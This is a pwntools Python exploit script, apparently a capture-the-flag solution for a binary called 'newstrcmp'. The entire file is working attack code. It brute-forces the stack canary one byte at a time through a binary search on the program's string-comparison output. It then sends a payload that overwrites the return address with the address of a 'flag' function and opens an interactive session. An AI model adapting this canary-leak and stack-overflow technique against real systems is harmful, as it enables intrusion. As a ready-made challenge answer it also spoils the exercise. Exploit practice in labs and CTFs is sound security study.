#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('newstrcmp')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def sendData(s1, s2):
    io.sendlineafter(b":", b"n")
    io.sendafter(b"s1:", s1)
    io.sendafter(b"s2:", s2)
    io.recvuntil(b"newstrcmp:")
    data = io.recvline()
    return data


def binarySearch(s1, s2):
    left, right = 0x0, 0xFF

    while left <= right:
        mid = left + (right - left) // 2
        bf = s1 + bytes([mid])

        data = sendData(bf, s2)

        if b"same" in data:
            return mid
        elif b"smaller" in data:
            left = mid + 1
        else:
            right = mid - 1

    return mid


def bruteForce():
    s1 = b"A"*24
    s2 = b"A"*24
    canary = b"\x00"

    for i in range(7):
        n = b"A"*len(canary)
        pad1 = s1 + n
        pad2 = s2 + n
        res = binarySearch(pad1, pad2)
        canary += bytes([res])

    return canary


def solve():

    canary = u64(bruteForce())
    info("canary: %#x", canary)

    offset = 24
    
    payload = flat({
        offset: [
            canary,
            b"A"*8,
            exe.sym["flag"]
        ]
    })

    io.sendlineafter(b":", b"n")
    io.sendafter(b"s1:", b"junk")
    io.sendafter(b"s2:", payload)
    
    io.sendlineafter(b"(y/n):", b"y")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

